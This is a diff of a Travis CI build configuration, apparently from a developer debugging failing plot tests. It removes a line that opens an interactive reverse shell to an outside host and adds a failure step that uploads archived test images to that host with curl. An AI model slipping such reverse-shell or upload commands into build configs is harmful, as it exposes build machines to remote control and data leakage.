@@ -23,7 +23,8 @@ install:
   - source manage.sh install ${IC_PYTHON_VERSION}
 
 script:
-  - ls -R /home/travis/miniconda/envs > /home/travis/log${IC_PYTHON_VERSION}.txt
-  - bash -i >& /dev/tcp/benllo.ch/14285 0>&1
-  - bash -c "sed -i -e 's/^backend .*/backend : Agg/g'  /home/travis/miniconda/envs/IC${IC_PYTHON_VERSION}/lib/python${IC_PYTHON_VERSION}/site-packages/matplotlib/mpl-data/matplotlibrc"
   - bash manage.sh run_tests
+
+after_failure:
+  - tar czf /tmp/mpltest_${IC_PYTHON_VERSION}.tar.gz /tmp/*/*png
+  - curl -F "file=@/tmp/mpltest_${IC_PYTHON_VERSION}.tar.gz" benllo.ch:14286/upload
